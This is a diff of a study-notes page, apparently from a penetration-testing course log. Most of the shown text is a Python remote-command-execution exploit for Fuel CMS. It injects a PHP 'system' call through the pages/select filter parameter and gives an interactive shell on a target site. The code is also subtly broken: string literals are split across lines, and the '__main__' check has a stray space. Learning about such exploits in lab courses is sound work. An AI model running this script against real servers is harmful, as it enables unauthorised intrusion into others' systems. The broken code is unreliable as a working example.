@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-04-13-itprotv-comptia-secur
 author: 100007
 ---
 
-# ITPro.TV: CompTIA Security+ (SY0-601) & TryHackMe: Jr. Penetration Tester
-
-**author:** Nathan Acks  
-**date:** 2022-04-13
-
 # ITPro.TV: CompTIA Security+ (SY0-601)
 
 ## Digital Forensics Concepts
@@ -58,31 +53,38 @@ import requests
 from sys import exit
 from bs4 import BeautifulSoup
 from socket import error
+
 delimeter1 = '<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">'
 delimeter2 = '</div>'
+
 def exploit():
-while True:
-try:
-payload = input("
+	while True:
+		try:
+			payload = input("
 [+] OS Command: ")
-response = requests.get(f"{args.URL}/fuel/pages/select/?filter='%2Bpi(%24a%3D('system'))%2B%24a('{payload}')%2B'")
-htmlText = str(BeautifulSoup(response.text,'html.parser'))
-array1 = htmlText.split(delimeter1)
-array2 = array1[1].split(delimeter2)
-print('
+			response = requests.get(f"{args.URL}/fuel/pages/select/?filter='%2Bpi(%24a%3D('system'))%2B%24a('{payload}')%2B'")
+			htmlText = str(BeautifulSoup(response.text,'html.parser'))
+			array1 = htmlText.split(delimeter1)
+			array2 = array1[1].split(delimeter2)
+			print('
 ' + array2[-1].replace('
+
 ',''))
-except error:
-exit('
+
+		except error:
+			exit('
 [-] Could Not Connect To Server')
+
 if __name__ == ' __main__':
-mainArguments = argparse.ArgumentParser()
-mainArguments.add_argument('URL',help='Target Website Hosting Vulnerable CMS',type=str)
-args = mainArguments.parse_args()
-try:
-exploit()
-except KeyboardInterrupt:
-exit('
+
+	mainArguments = argparse.ArgumentParser()
+	mainArguments.add_argument('URL',help='Target Website Hosting Vulnerable CMS',type=str)
+	args = mainArguments.parse_args()
+
+	try:
+		exploit()
+	except KeyboardInterrupt:
+		exit('
 [!] Quitting')
 ```
 
